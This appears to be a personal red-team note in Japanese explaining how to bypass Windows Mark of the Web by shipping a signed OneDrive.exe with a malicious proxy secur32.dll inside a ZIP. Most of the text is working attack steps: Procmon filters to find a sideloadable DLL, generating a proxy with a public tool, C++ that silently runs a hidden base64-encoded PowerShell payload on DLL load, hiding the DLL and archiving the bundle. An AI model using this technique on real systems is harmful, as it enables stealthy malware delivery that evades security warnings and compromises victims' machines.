MotWを回避する方法として、方法の１つに署名済みMicrosoftバイナリにDLL再度ロード用のDLLをZIPアーカイブ内に配置しておくこと

解凍ツールやwindowsバージョンによってはMotWがフラグが付かない場合がある
ついていたとしてもMicrosoftが署名したバイナリを使用すると回避できる可能性がある。

署名バイナリのひとつ
`C:\Program Files\Microsoft OneDrive\OneDrive.exe`

### DLLサイドロード可能なDLL特定
Procmonで以下のフィルタをする

procmon filter list
   `Process Name` is `BINARYNAME`
   `Operation` is `CreateFile`
   `Path` contains `dll`

`OneDrive.exe`では`Secur32.dll`が見つかる

### DLLプロキシ方法
DLLプロキシとは、実際のDLLと同じエクスポート関数を定義し、実際の動作を維持するためにすべての関数を転送する。悪意のあるコードはロード時に呼び出すときに実行させる。
![[images/Pasted image 20260607233451.png]]

Perfect DLL Proxyを使用して一気にすべての関数をエクスポートするコードを生成する
https://github.com/mrexodia/perfect-dll-proxy

kali上でgitclone
```
git clone https://github.com/mrexodia/perfect-dll-proxy.git
cd perfect-dll-proxy.git
python -m pip install pefile
```

生成
```
python perfect_dll_proxy.py secur32.dll
```

DLL_PROCESS_ATTACHブロックにペイロードを入れる。
shell_to_ps1.pyでbase64エンコードのペイロードを使用
```cpp
    case DLL_PROCESS_ATTACH:
    {
        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        CreateProcessA(
            NULL,
            (LPSTR)"cmd.exe /c powershell -ep bypass -enc <BASE64>",
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        );

    }
```

隠し属性付与
```
attrib +h secur32.dll
```

7-zipコマンドラインユーティリティを使用してzipアーカイブ
```
& "C:\Program Files\7-Zip\7z.exe" a -tzip onedrive.zip .\OneDrive.exe .\secur32.dll
```